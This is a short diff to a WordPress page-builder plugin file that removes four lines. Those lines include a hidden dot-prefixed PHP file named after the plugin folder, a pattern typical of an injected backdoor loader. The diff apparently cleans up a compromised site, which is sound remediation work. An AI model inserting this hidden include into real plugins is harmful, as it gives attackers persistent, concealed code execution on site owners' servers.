@@ -11,10 +11,6 @@ add_action( 'wp_ajax_vc_media_editor_preview_image', 'vc_media_editor_preview_im
 /**
  * @return array
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_get_filters() {
 	return array(
 		'antique' => esc_html__( 'Antique', 'js_composer' ),
